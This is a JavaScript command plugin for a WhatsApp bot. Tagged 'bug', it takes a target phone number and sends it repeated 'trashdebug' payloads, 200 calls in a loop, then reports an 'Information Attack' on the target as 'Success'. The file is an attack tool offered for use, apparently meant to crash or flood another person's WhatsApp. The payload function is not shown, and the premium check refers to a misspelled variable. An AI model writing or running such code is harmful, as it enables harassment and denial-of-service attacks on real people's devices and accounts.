const axios = require("axios");
 
let trashplug = async (m, { trashdebug,reply,text,trashown,prefix,command,trashcore,sleep }) => {
if (!itrashown) return reply(mess.premium)
if (!text) return reply(`*Format Invalid!*\nUse: ${prefix + command} 254xxx`)
    
let client = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g,'')
let isTarget = client + "@s.whatsapp.net"
await trashcore.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
  let process = `*Information Attack*
* Sender : ${m.pushName}
* Target : ${client}
* Status : ⏳ Processing...
`
await trashcore.sendMessage(m.chat, { react: { text: '🆘', key: m.key } }); 
reply(process) 
for (let r = 0; r < 50; r++) {
await trashdebug(isTarget);
await sleep(5000)
await trashdebug(isTarget);
await trashdebug(isTarget);
await sleep(5000)
await trashdebug(isTarget);
}

let put = `*Information Attack*
* Target : ${client}
* Status : Success
`
await trashcore.sendMessage(m.chat, { react: { text: '✅', key: m.key } }); 
reply(put)
};  
trashplug.help = ['trash']
trashplug.tags = ['bug']
trashplug.command = ['trash']
 
module.exports = trashplug;